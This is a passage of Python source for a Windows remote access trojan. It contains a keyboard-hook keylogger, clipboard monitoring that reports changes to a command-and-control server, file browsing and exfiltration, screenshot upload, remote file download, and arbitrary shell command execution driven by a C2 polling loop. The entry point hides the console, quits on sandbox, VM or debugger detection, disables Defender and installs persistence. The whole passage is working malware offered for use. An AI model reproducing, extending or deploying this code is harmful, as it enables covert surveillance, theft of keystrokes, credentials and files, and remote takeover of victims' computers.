            err = kernel32.GetLastError()
            _keylog_append(f"[!] Hook installation failed (error {err})\n")
            return
        msg = wintypes.MSG()
        while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
            pass                                                 # message pump only

    _keylog_active = True
    _keylog_thread = threading.Thread(target=pump, daemon=True)
    _keylog_thread.start()
    return "[+] Keylogger started — 'keydump' retrieves captured keystrokes"


def stop_keylogger(clear_buffer=True):
    global _keylog_active, _keylog_hook
    if not _keylog_active:
        if clear_buffer:
            with _keylog_lock:
                _keylog_buffer.clear()
        return "[*] Keylogger not running"
    _keylog_active = False
    try:
        user32.PostThreadMessageW(_keylog_tid, WM_QUIT, 0, 0)
    except Exception:
        pass
    _keylog_hook = None                                         # release hook handle
    out = "[+] Keylogger stopped"
    if clear_buffer:
        with _keylog_lock:
            _keylog_buffer.clear()
        out += ", buffer cleared"
    else:
        out += " — 'keydump' still retrieves the captured buffer"
    return out


def dump_keystrokes():
    with _keylog_lock:
        chunks, _keylog_buffer[:] = _keylog_buffer[:], []
    data = "".join(chunks).strip("\n")
    if not data:
        state = "running" if _keylog_active else "not running"
        return f"[*] No keystrokes captured yet (keylogger {state})"
    head = f"[KEYLOG DUMP — {len(data):,} chars, buffer cleared]"
    tail = "\n[i] Buffer truncated" if len(data) > MAX_RESULT_BYTES else ""
    return f"{head}\n{data[:MAX_RESULT_BYTES]}{tail}"


# ============================================================
#  Clipboard Functions
# ============================================================
_clipboard_monitor_active = False
_clipboard_thread = None
_last_clipboard = ""

# Set proper ctypes return/arg types for clipboard (prevents 64-bit pointer truncation)
ctypes.windll.user32.OpenClipboard.argtypes = [ctypes.c_void_p]
ctypes.windll.user32.OpenClipboard.restype = ctypes.c_bool
ctypes.windll.user32.CloseClipboard.restype = ctypes.c_bool
ctypes.windll.user32.GetClipboardData.argtypes = [ctypes.c_uint]
ctypes.windll.user32.GetClipboardData.restype = ctypes.c_void_p
ctypes.windll.kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
ctypes.windll.kernel32.GlobalLock.restype = ctypes.c_void_p
ctypes.windll.kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
ctypes.windll.kernel32.GlobalUnlock.restype = ctypes.c_bool


def get_clipboard():
    """Get current clipboard text content using ctypes (no dependencies)"""
    try:
        if not ctypes.windll.user32.OpenClipboard(None):
            return "[-] Clipboard is locked by another app"
        try:
            handle = ctypes.windll.user32.GetClipboardData(13)  # CF_UNICODETEXT
            if not handle:
                return "[-] Clipboard has no text data"
            ptr = ctypes.windll.kernel32.GlobalLock(handle)
            if not ptr:
                return "[-] Failed to lock clipboard memory"
            try:
                text = ctypes.wstring_at(ptr)
                if text:
                    return f"[+] Clipboard content:\n{text}"
                else:
                    return "[-] Clipboard is empty"
            finally:
                ctypes.windll.kernel32.GlobalUnlock(handle)
        finally:
            ctypes.windll.user32.CloseClipboard()
    except Exception as e:
        return f"[-] Clipboard error: {str(e)}"


def _clipboard_monitor_loop():
    """Background loop: check clipboard every 3s, send changes to C2"""
    global _last_clipboard, _clipboard_monitor_active

    while _clipboard_monitor_active:
        try:
            if not ctypes.windll.user32.OpenClipboard(None):
                time.sleep(3)
                continue
            try:
                handle = ctypes.windll.user32.GetClipboardData(13)
                if handle:
                    ptr = ctypes.windll.kernel32.GlobalLock(handle)
                    if ptr:
                        try:
                            current = ctypes.wstring_at(ptr) or ""
                        finally:
                            ctypes.windll.kernel32.GlobalUnlock(handle)
                    else:
                        current = ""
                else:
                    current = ""
            finally:
                ctypes.windll.user32.CloseClipboard()

            if current and current != _last_clipboard:
                _last_clipboard = current
                send_result({
                    "output": f"[📋 CLIPBOARD] {current}",
                    "client_id": client_id
                })
                flush_outbox()

        except Exception:
            pass

        time.sleep(3)


def start_clipboard_monitor():
    """Start background clipboard monitoring"""
    global _clipboard_monitor_active, _clipboard_thread
    if _clipboard_monitor_active:
        return
    _clipboard_monitor_active = True
    _clipboard_thread = threading.Thread(target=_clipboard_monitor_loop, daemon=True)
    _clipboard_thread.start()


def stop_clipboard_monitor():
    """Stop background clipboard monitoring"""
    global _clipboard_monitor_active
    _clipboard_monitor_active = False


# ============================================================
#  File Browser
# ============================================================
MAX_FILE_LIST_ITEMS = 500


def _format_size(size):
    """Format byte size to human readable string"""
    if size < 1024:
        return f"{size} B"
    elif size < 1024 * 1024:
        return f"{size / 1024:.1f} KB"
    elif size < 1024 * 1024 * 1024:
        return f"{size / (1024*1024):.1f} MB"
    else:
        return f"{size / (1024*1024*1024):.2f} GB"


def resolve_special_folder(folder_type):
    """Resolve Windows special folders dynamically via Registry (handles OneDrive redirection)"""
    home = os.path.expanduser('~')
    folder_type = folder_type.lower()
    reg_map = {
        'desktop': 'Desktop',
        'documents': 'Personal',
        'downloads': '{374DE290-123F-4565-9164-39C4925E467B}',
        'pictures': 'My Pictures',
        'videos': 'My Video',
        'music': 'My Music',
        'favorites': 'Favorites',
        'appdata': 'AppData',
    }

    if folder_type in reg_map:
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders') as key:
                val, _ = winreg.QueryValueEx(key, reg_map[folder_type])
                path = os.path.expandvars(val)
                if os.path.isdir(path):
                    return path
        except Exception:
            pass

    onedrive_base = os.environ.get('OneDrive', os.path.join(home, 'OneDrive'))
    fallbacks = {
        'desktop': [os.path.join(home, 'Desktop'), os.path.join(onedrive_base, 'Desktop')],
        'documents': [os.path.join(home, 'Documents'), os.path.join(onedrive_base, 'Documents')],
        'downloads': [os.path.join(home, 'Downloads')],
        'pictures': [
            os.path.join(onedrive_base, 'Documents', 'Pictures'),
            os.path.join(onedrive_base, 'Pictures'),
            os.path.join(home, 'Pictures')
        ],
        'videos': [os.path.join(home, 'Videos'), os.path.join(onedrive_base, 'Videos')],
        'music': [os.path.join(home, 'Music'), os.path.join(onedrive_base, 'Music')],
        'favorites': [os.path.join(home, 'Favorites')],
        'onedrive': [onedrive_base, os.path.join(home, 'OneDrive')],
        'appdata': [os.environ.get('APPDATA', os.path.join(home, 'AppData', 'Roaming'))]
    }

    candidates = fallbacks.get(folder_type, [])
    for c in candidates:
        if os.path.isdir(c):
            return c
    return candidates[0] if candidates else os.path.join(home, folder_type.capitalize())


def browse_files(path=""):
    """List files and directories with details — returns JSON for fast frontend parsing"""
    global current_dir
    try:
        clean_path = path.strip().strip('"').strip("'") if path else ""

        # Strip leading option flags (e.g. "ls -a .") — no flags are supported
        while clean_path.startswith('-'):
            parts = clean_path.split(None, 1)
            clean_path = parts[1].strip() if len(parts) > 1 else ""

        # Special case: Resolve well-known folders dynamically
        if clean_path.startswith("SPECIAL:"):
            raw = clean_path.split(":", 1)[1]
            parts = raw.replace("\\", "/").split("/", 1)
            folder_type = parts[0].lower()
            base_folder = resolve_special_folder(folder_type)
            if len(parts) > 1 and parts[1].strip():
                clean_path = os.path.join(base_folder, parts[1].replace("/", os.sep))
            else:
                clean_path = base_folder

        # Bare drive letter ("C:") is drive-relative on Windows and resolves to the
        # client's cwd on that drive — force it to the drive root instead
        if len(clean_path) == 2 and clean_path[1] == ':':
            clean_path += os.sep

        upper_path = clean_path.upper()

        # Special case: list drives
        if upper_path == "DRIVES":
            drives = []
            bitmask = ctypes.windll.kernel32.GetLogicalDrives()
            for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
                if bitmask & 1:
                    drives.append({
                        "name": f"{letter}:/",
                        "size": "DRIVE",
                        "date": "-----",
                        "is_dir": True
                    })
                bitmask >>= 1
            result = {
                "path": "System Drives",
                "items": drives,
                "count": len(drives),
                "truncated": False
            }
            return "[JSON_FILES]" + json.dumps(result)

        target_path = clean_path if clean_path else current_dir

        if not os.path.isabs(target_path) and not (len(target_path) >= 2 and target_path[1] == ':'):
            target_path = os.path.join(current_dir, target_path)

        target_path = os.path.abspath(target_path)

        if not os.path.isdir(target_path):
            return f"[-] Not a directory: {target_path}"

        current_dir = target_path

        dirs_list = []
        files_list = []
        try:
            with os.scandir(target_path) as scanner:
                for entry in scanner:
                    try:
                        is_dir = entry.is_dir(follow_symlinks=False)
                        try:
                            stat = entry.stat(follow_symlinks=False)
                            mod_time = time.strftime("%Y-%m-%d %H:%M", time.localtime(stat.st_mtime))
                            size_str = "DIR" if is_dir else _format_size(stat.st_size)
                        except (PermissionError, OSError):
                            mod_time = "????"
                            size_str = "???" if not is_dir else "DIR"

                        item = {
                            "name": entry.name,
                            "size": size_str,
                            "date": mod_time,
                            "is_dir": is_dir
                        }
                        if is_dir:
                            dirs_list.append(item)
                        else:
                            files_list.append(item)
                    except (PermissionError, OSError):
                        files_list.append({
                            "name": entry.name,
                            "size": "???",
                            "date": "????",
                            "is_dir": False
                        })
        except PermissionError:
            return f"[-] Permission denied: {target_path}"

        dirs_list.sort(key=lambda x: x["name"].lower())
        files_list.sort(key=lambda x: x["name"].lower())
        all_items = dirs_list + files_list

        total_count = len(all_items)
        truncated = total_count > MAX_FILE_LIST_ITEMS
        if truncated:
            all_items = all_items[:MAX_FILE_LIST_ITEMS]

        result = {
            "path": target_path,
            "items": all_items,
            "count": total_count,
            "truncated": truncated
        }
        return "[JSON_FILES]" + json.dumps(result)

    except Exception as e:
        return f"[-] Browse error: {str(e)}"


# ============================================================
#  File Preview  (no PIL — raw read only)
# ============================================================
def preview_file(path):
    """Generate file preview payload for remote files (no Pillow dependency)"""
    global current_dir
    try:
        clean_path = path.strip().strip('"').strip("'") if path else ""
        if not clean_path:
            return "[JSON_PREVIEW]" + json.dumps({"status": "error", "message": "No path provided"})

        target_path = clean_path
        if not os.path.isabs(target_path) and not (len(target_path) >= 2 and target_path[1] == ':'):
            target_path = os.path.join(current_dir, target_path)
        target_path = os.path.abspath(target_path)

        if not os.path.isfile(target_path):
            return "[JSON_PREVIEW]" + json.dumps({"status": "error", "message": f"File not found: {target_path}"})

        ext = os.path.splitext(target_path)[1].lower()
        size = os.path.getsize(target_path)
        size_str = _format_size(size)

        img_exts = {
            '.png': 'image/png',
            '.jpg': 'image/jpeg',
            '.jpeg': 'image/jpeg',
            '.gif': 'image/gif',
            '.bmp': 'image/bmp',
            '.webp': 'image/webp',
            '.ico': 'image/x-icon'
        }
        text_exts = {
            '.txt', '.log', '.py', '.js', '.ts', '.jsx', '.tsx', '.json', '.xml',
            '.html', '.htm', '.css', '.ini', '.cfg', '.bat', '.ps1', '.cmd', '.sh',
            '.yaml', '.yml', '.md', '.csv', '.env', '.toml', '.sql', '.c', '.cpp',
            '.h', '.hpp', '.rs', '.go', '.java'
        }

        # 1. Image Preview — raw read (no resizing without PIL, but cap at 10 MB)
        if ext in img_exts:
            if size > 10 * 1024 * 1024:
                return "[JSON_PREVIEW]" + json.dumps({
                    "status": "unsupported",
                    "type": "image",
                    "name": os.path.basename(target_path),
                    "path": target_path,
                    "size": size_str,
                    "message": "Image too large for preview. Use the Download button."
                })
            with open(target_path, "rb") as f:
                raw_bytes = f.read()
                b64_data = base64.b64encode(raw_bytes).decode('utf-8')
            return "[JSON_PREVIEW]" + json.dumps({
                "status": "ok",
                "type": "image",
                "name": os.path.basename(target_path),
                "path": target_path,
                "mime": img_exts.get(ext, "image/png"),
                "data": b64_data,
                "size": size_str
            })

        # 2. Text / Code Preview
        elif ext in text_exts or size < 120000:
            try:
                with open(target_path, "r", encoding="utf-8", errors="replace") as f:
                    content = f.read(120000)
                return "[JSON_PREVIEW]" + json.dumps({
                    "status": "ok",
                    "type": "text",
                    "name": os.path.basename(target_path),
                    "path": target_path,
                    "content": content,
                    "size": size_str
                })
            except Exception as e:
                return "[JSON_PREVIEW]" + json.dumps({"status": "error", "message": f"Read error: {str(e)}"})

        # 3. Binary / Other files
        else:
            return "[JSON_PREVIEW]" + json.dumps({
                "status": "unsupported",
                "type": "binary",
                "name": os.path.basename(target_path),
                "path": target_path,
                "size": size_str,
                "message": "Direct preview is not supported for binary files. Use the Download button to retrieve the complete file."
            })

    except Exception as e:
        return "[JSON_PREVIEW]" + json.dumps({"status": "error", "message": str(e)})


# ============================================================
#  Installed Apps Enumeration
# ============================================================
_last_apps_cache = []  # populated by the "apps" command, reused by "appicons"

APP_UNINSTALL_KEYS = (
    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
    (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
)


def _get_installed_apps():
    """Enumerate installed applications from registry uninstall keys"""
    apps = {}
    for hive, subkey in APP_UNINSTALL_KEYS:
        try:
            with winreg.OpenKey(hive, subkey) as base:
                i = 0
                while True:
                    try:
                        key_name = winreg.EnumKey(base, i)
                        i += 1
                    except OSError:
                        break
                    try:
                        with winreg.OpenKey(base, key_name) as k:
                            def get_val(name):
                                try:
                                    v, _ = winreg.QueryValueEx(k, name)
                                    return v
                                except OSError:
                                    return None

                            name = get_val("DisplayName")
                            if not name or not str(name).strip():
                                continue
                            # Skip hotfixes/updates noise and broken template entries
                            if name.startswith("KB") or "Update for Microsoft" in name or "Security Update" in name:
                                continue
                            if "${" in name or "{{" in name or name.lower().startswith("{"):
                                continue

                            size_kb = get_val("EstimatedSize")
                            raw_date = str(get_val("InstallDate") or "")
                            # Registry dates come as YYYYMMDD
                            install_date = (f"{raw_date[:4]}-{raw_date[4:6]}-{raw_date[6:8]}"
                                            if len(raw_date) == 8 and raw_date.isdigit() else "")

                            icon_loc = str(get_val("DisplayIcon") or "").split(",")[0].strip().strip('"')

                            entry = {
                                "name": str(name).strip(),
                                "version": str(get_val("DisplayVersion") or "").strip(),
                                "publisher": str(get_val("Publisher") or "").strip(),
                                "location": str(get_val("InstallLocation") or "").strip(),
                                "date": install_date,
                                "size": _format_size(size_kb * 1024) if isinstance(size_kb, (int, float)) and size_kb > 0 else "",
                                "uninstall": str(get_val("UninstallString") or "").strip(),
                                "icon_path": icon_loc,
                            }
                            key = entry["name"].lower()
                            # Keep first occurrence; HKLM entries beat HKCU dupes by order
                            if key not in apps:
                                apps[key] = entry
                    except (OSError, PermissionError):
                        continue
        except (OSError, PermissionError):
            continue

    result = sorted(apps.values(), key=lambda a: a["name"].lower())
    return result


def _collect_app_icons(apps, max_total_bytes=400 * 1024, max_per_icon=100 * 1024):
    """Extract small standalone icon files (.ico/.png/.bmp) as data URIs.
    EXE-embedded icons can't be extracted without PE parsing — those fall back
    to frontend letter tiles."""
    icons = {}
    total = 0
    for app in apps:
        loc = app.get("icon_path", "")
        if not loc or not os.path.isfile(loc):
            continue
        ext = os.path.splitext(loc)[1].lower()
        if ext not in ('.ico', '.png', '.bmp'):
            continue
        try:
            if os.path.getsize(loc) > max_per_icon:
                continue
            with open(loc, "rb") as f:
                raw = f.read()
            if total + len(raw) > max_total_bytes:
                break
            mime = {'.ico': 'image/x-icon', '.png': 'image/png', '.bmp': 'image/bmp'}[ext]
            icons[app["name"]] = f"data:{mime};base64,{base64.b64encode(raw).decode('utf-8')}"
            total += len(raw)
        except (OSError, PermissionError):
            continue
    return icons


# ============================================================
#  Command Execution
# ============================================================
def execute_command(cmd):
    """Execute a command and return the result"""
    if DEBUG: print(f"[*] Executing command: {cmd}")
    global current_dir, POLLING_DELAY

    try:
        # === Built-in commands ===

        if cmd == "sysinfo":
            return get_system_info()

        elif cmd == "ps":
            return get_process_list()

        elif cmd == "apps":
            global _last_apps_cache
            try:
                _last_apps_cache = _get_installed_apps()
                return "[JSON_APPS]" + json.dumps({"items": _last_apps_cache, "count": len(_last_apps_cache)})
            except Exception as e:
                return "[JSON_APPS]" + json.dumps({"items": [], "count": 0, "error": str(e)})

        elif cmd == "appicons":
            try:
                icons = _collect_app_icons(_last_apps_cache)
                return "[JSON_ICONS]" + json.dumps({"icons": icons})
            except Exception as e:
                return "[JSON_ICONS]" + json.dumps({"icons": {}, "error": str(e)})

        elif cmd.startswith("killproc "):
            target = cmd[9:].strip().strip('"').strip("'")
            try:
                if target.isdigit():
                    subprocess.check_output(f"taskkill /F /PID {target}", shell=True, stderr=subprocess.STDOUT)
                else:
                    if not target.lower().endswith(".exe"):
                        target += ".exe"
                    subprocess.check_output(f"taskkill /F /IM {target}", shell=True, stderr=subprocess.STDOUT)
                return f"[+] Process {target} killed"
            except Exception as e:
                return f"[-] Failed to kill process: {str(e)}"

        elif cmd == "screenshot":
            screenshot_data = take_screenshot()
            if screenshot_data.startswith("[-]"):
                return screenshot_data
            try:
                timestamp = time.strftime("%Y%m%d_%H%M%S")
                c2_post("/upload", {
                    "file": screenshot_data,
                    "name": f"screenshot_{timestamp}.png",
                    "client_id": client_id
                })
                return "[+] Screenshot captured and uploaded"
            except Exception as e:
                return f"[-] Screenshot captured but upload failed: {str(e)}"

        elif cmd == "pwd":
            return current_dir

        elif cmd.startswith("cd "):
            path = cmd[3:].strip().strip('"').strip("'")
            if path == "~":
                path = os.path.expanduser("~")
            new_dir = os.path.normpath(os.path.join(current_dir, path))
            if os.path.isdir(new_dir):
                current_dir = os.path.abspath(new_dir)
                return f"[+] Changed directory to: {current_dir}"
            else:
                return f"[-] Directory not found: {new_dir}"

        elif cmd.startswith("sleep "):
            try:
                new_delay = int(cmd.split(" ", 1)[1])
                if 1 <= new_delay <= 3600:
                    POLLING_DELAY = new_delay
                    return f"[+] Polling interval changed to {new_delay}s"
                else:
                    return "[-] Sleep must be between 1 and 3600 seconds"
            except ValueError:
                return "[-] Invalid sleep value"

        elif cmd.startswith("dialog "):
            content = cmd[7:].strip()
            if "|" in content:
                title, message = content.split("|", 1)
                title = title.strip()
                message = message.strip()
            else:
                title = "Alert"
                message = content
            threading.Thread(
                target=lambda t=title, m=message: ctypes.windll.user32.MessageBoxW(0, m, t, 0x40),
                daemon=True
            ).start()
            return f'[+] Dialog shown: "{title}"'

        elif cmd == "persist":
            add_persistence()
            return "[+] Persistence re-applied"

        elif cmd == "kill":
            send_result({
                "output": "[+] Self-destruct initiated. Goodbye.",
                "client_id": client_id
            })
            flush_outbox()
            self_destruct()

        elif cmd.startswith("download "):
            _, path = cmd.split(" ", 1)
            path = path.strip().strip('"').strip("'")
            if not os.path.isabs(path):
                path = os.path.join(current_dir, path)
            if os.path.exists(path):
                file_size = os.path.getsize(path)
                if file_size > 50 * 1024 * 1024:
                    return f"[-] File too large ({_format_size(file_size)}). Max 50MB for upload."
                if file_size == 0:
                    return "[-] File is empty"
                try:
                    with open(path, "rb") as f:
                        data = base64.b64encode(f.read()).decode()
                    c2_post("/upload", {
                        "file": data,
                        "name": os.path.basename(path),
                        "client_id": client_id
                    })
                    return f"[+] File uploaded to C2: {os.path.basename(path)} ({_format_size(file_size)})"
                except Exception as e:
                    return f"[-] Upload failed: {str(e)}"
            else:
                return f"[-] File not found: {path}"

        elif cmd.startswith("upload "):
            parts = cmd.split(" ", 2)
            if len(parts) < 3:
                return "[-] Usage: upload <url> <destination_path>"
            _, url, dst = parts
            if not os.path.isabs(dst):
                dst = os.path.join(current_dir, dst)
            try:
                req = urllib.request.Request(url, headers={"User-Agent": _get_ua()})
                resp = urllib.request.urlopen(req, timeout=30, context=_ssl_ctx)
                content_length = resp.headers.get("Content-Length")
                if content_length and int(content_length) > 200 * 1024 * 1024:
                    return f"[-] File too large ({int(content_length) // (1024*1024)}MB). Max 200MB."
                with open(dst, "wb") as f:
                    while True:
                        chunk = resp.read(8192)
                        if not chunk:
                            break
                        f.write(chunk)
                dl_size = os.path.getsize(dst)
                return f"[+] Downloaded {url} to {dst} ({_format_size(dl_size)})"
            except socket.timeout:
                return f"[-] Download timed out: {url}"
            except (urllib.error.URLError, ConnectionError, OSError):
                return f"[-] Could not connect to: {url}"
            except urllib.error.HTTPError as e:
                return f"[-] HTTP error: {e.code} {e.reason}"
            except Exception as e:
                return f"[-] Download failed: {str(e)}"

        # === Clipboard Commands ===
        elif cmd == "clip":
            return get_clipboard()

        elif cmd == "clipwatch":
            start_clipboard_monitor()
            return "[+] Clipboard monitor started (logging changes to C2)"

        elif cmd == "clipstop":
            stop_clipboard_monitor()
            return "[+] Clipboard monitor stopped"

        # === Keylogger Commands ===
        elif cmd == "keystart":
            return start_keylogger()

        elif cmd == "keystop":
            return stop_keylogger(clear_buffer=False)

        elif cmd == "keydump":
            return dump_keystrokes()

        # === File Browser ===
        elif cmd == "ls" or cmd.startswith("ls "):
            raw_path = cmd[3:].strip() if cmd.startswith("ls ") else ""
            if (raw_path.startswith('"') and raw_path.endswith('"')) or (raw_path.startswith("'") and raw_path.endswith("'")):
                path = raw_path[1:-1]
            else:
                path = raw_path
            return browse_files(path)

        elif cmd.startswith("preview ") or cmd.startswith("view "):
            raw_path = cmd.split(" ", 1)[1].strip()
            if (raw_path.startswith('"') and raw_path.endswith('"')) or (raw_path.startswith("'") and raw_path.endswith("'")):
                path = raw_path[1:-1]
            else:
                path = raw_path
            return preview_file(path)

        else:
            # Shell command execution
            try:
                output = subprocess.check_output(
                    cmd, shell=True, stderr=subprocess.STDOUT,
                    stdin=subprocess.DEVNULL, cwd=current_dir, timeout=CMD_TIMEOUT
                )
                text = output.decode(encoding='utf-8', errors='replace')
                if len(text) > MAX_RESULT_BYTES:
                    text = text[:MAX_RESULT_BYTES] + f"\n[!] Output truncated at {MAX_RESULT_BYTES // 1024} KB"
                return text
            except subprocess.TimeoutExpired:
                return f"[-] Command timed out after {CMD_TIMEOUT}s: {cmd}"

    except Exception as e:
        return f"[-] Error: {str(e)}"


# ============================================================
#  Main C2 Connection Loop
# ============================================================
def connect_c2():
    """Main C2 connection loop with encrypted comms, jitter, and exponential backoff"""
    if DEBUG: print("[*] Starting C2 connection loop...")
    global client_id
    backoff = RETRY_BACKOFF_MIN

    while True:
        try:
            time.sleep(random.uniform(1, 2))

            # Quick reachability check
            try:
                _http_get(f"{C2_DOMAIN}/test", timeout=5)
            except Exception:
                wait = min(backoff, RETRY_BACKOFF_MAX)
                print(f"[!] Server unreachable — retrying in {wait}s...")
                time.sleep(wait)
                backoff = min(backoff * 2, RETRY_BACKOFF_MAX)
                continue

            # Server is up — reset backoff
            backoff = RETRY_BACKOFF_MIN

            # Gather system info
            try:
                resp = _http_get("https://api.ipify.org", timeout=10)
                ip = resp.text.strip()
            except Exception:
                ip = "unknown"

            hostname = socket.gethostname()
            os_info = f"{platform.system()} {platform.release()} ({platform.version()})"
            pid = os.getpid()
            # Stable identity: same machine+user keeps ONE dashboard entry across
            # IP changes — the external IP is display info, not identity
            username = get_username()
            client_id = f"{hostname}:{username}:{get_stable_machine_id()[:8]}"

            try:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            except Exception:
                is_admin = False

            session_info = {
                "ip": ip,
                "host": hostname,
                "os": os_info,
                "pid": pid,
                "user": username,
                "admin": is_admin,
                "client_id": client_id
            }
            if DEBUG: print(f"[*] Registering client: {client_id}")
            resp = c2_post("/register", session_info)
            if resp and resp.status_code == 200:
                if DEBUG: print("[+] Registered successfully.")
            else:
                status = resp.status_code if resp else "No Response"
                if DEBUG: print(f"[-] Registration failed with status: {status}")
                time.sleep(RETRY_DELAY)
                continue

            # Command polling loop
            while True:
                had_command = False
                try:
                    # Retry any results that failed to deliver on earlier cycles
                    flush_outbox()

                    cmd_data = c2_get("/cmd", params={"id": client_id})
                    if cmd_data:
                        if cmd_data.get("action") == "re-register":
                            break

                        cmd = cmd_data.get("command")
                        if cmd:
                            had_command = True
                            result = execute_command(cmd)
                            if result is not None:
                                send_result({
                                    "output": result,
                                    "command": cmd,
                                    "client_id": client_id
                                })
                                flush_outbox()
                except ConnectionError:
                    print("[!] Lost connection — reconnecting...")
                    break
                except Exception:
                    pass

                # If a command was just executed, immediately check for the next command without sleeping
                if had_command:
                    continue

                jitter = random.uniform(-JITTER, JITTER)
                time.sleep(max(0.3, POLLING_DELAY + jitter))

        except ConnectionError:
            wait = min(backoff, RETRY_BACKOFF_MAX)
            print(f"[!] Server unreachable — retrying in {wait}s...")
            time.sleep(wait)
            backoff = min(backoff * 2, RETRY_BACKOFF_MAX)
        except socket.timeout:
            print(f"[!] Request timed out — retrying in 5s...")
            time.sleep(5)
            backoff = min(backoff * 2, RETRY_BACKOFF_MAX)
        except Exception:
            time.sleep(RETRY_DELAY)


# ============================================================
#  Entry Point
# ============================================================
if __name__ == "__main__":
    hide_console()
    check_single_instance()

    if ANTI_VM and is_vm_or_sandbox():
        sys.exit(0)
    if is_debugger_present():
        sys.exit(0)

    disable_defender()
    add_persistence()
    connect_c2()